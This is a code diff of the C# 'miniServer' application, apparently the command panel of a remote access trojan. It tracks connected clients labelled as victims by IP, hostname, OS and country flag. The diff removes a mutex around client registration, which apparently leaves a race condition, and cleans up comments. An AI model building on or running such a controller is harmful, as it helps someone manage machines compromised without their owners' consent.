@@ -17,7 +17,6 @@ namespace miniServer
         //must be same in client and server.
         const string separator = "|||";
         private static Mutex gridMutex = new Mutex();
-        private static Mutex idMutex = new Mutex();
 
         Thread serverThread;
         TcpListener serverTcp;
@@ -107,7 +106,6 @@ namespace miniServer
                                 //string hostName = receive[3];
 
                                 //A new client
-                                //AddNewClienet(tcpClient, receive[1], receive[2], receive[3], incomming, hostName);
                                 AddNewClienet(tcpClient, receive[1], receive[2], receive[3], incomming);
                                 return;
 
@@ -135,7 +133,6 @@ namespace miniServer
         {
             string ClientIdString = incomming.Split(new string[] { separator }, StringSplitOptions.None)[0];
             miniClient mc = clientList?.Where(e => e.ID.ToString() == ClientIdString.ToString()).FirstOrDefault();
-            idMutex.WaitOne();
             if (mc == null)
             {
                 Guid Id;
@@ -144,14 +141,12 @@ namespace miniServer
                     Id = Guid.NewGuid();
                 mc = new miniClient(Id, tcpClient, os, version, hostName);
                 clientList.Add(mc);
-                //idMutex.ReleaseMutex();
             }
             else
             {
                 mc.RenewConnection(tcpClient, mc.IsAlive);// when this connection is new client with same guid key then kill exist client and renew it
             }
 
-            idMutex.ReleaseMutex();
             //Hello is for future use
             mc.SendToClient(mc.ID.ToString() + separator + "Hello");
 
@@ -160,15 +155,14 @@ namespace miniServer
             dataGridViewClients.Invoke((MethodInvoker)delegate
             {
                 var existRow = dataGridViewClients.Rows.Cast<DataGridViewRow>().Where(r => r.Cells[1].Value.ToString().Equals(mc.ID.ToString())).FirstOrDefault();
-                if (existRow == null)
+                if (existRow == null) //ADD new client to datagridview
                 {
-                    //ADD new client to datagridview
                     DataGridViewRow row = new DataGridViewRow();
                     row.CreateCells(dataGridViewClients);
                     //TODO:IP country Flag
                     row.Cells[0].Value = getFlagOfIP(mc.IP);//getFlagOfIP(mc.IP);//IP country Flag
                     row.Cells[1].Value = mc.ID;//ID
-                                               //Note is emty
+                                               //Note is empty
                     row.Cells[3].Value = mc.IP;//Victim IP and Port
                     row.Cells[4].Value = mc.HostName;//Victim HostName
                     row.Cells[5].Value = mc.OS;//Victim OS version
@@ -424,12 +418,12 @@ namespace miniServer
             object O = Resources.ResourceManager.GetObject(country);
             return (Image)O;
 
-            /* other information
-              label1.Text = geoip.GeoInfo.Country;
-            label2.Text = geoip.GeoInfo.City;
-            label3.Text = geoip.GeoInfo.CountryCode;
-            label4.Text = geoip.ImageIndex.ToString();
-             */
+            /* other information  */
+            //label1.Text = geoip.GeoInfo.Country;
+            //label2.Text = geoip.GeoInfo.City;
+            //label3.Text = geoip.GeoInfo.CountryCode;
+            //label4.Text = geoip.ImageIndex.ToString();
+            
 
         }
     }
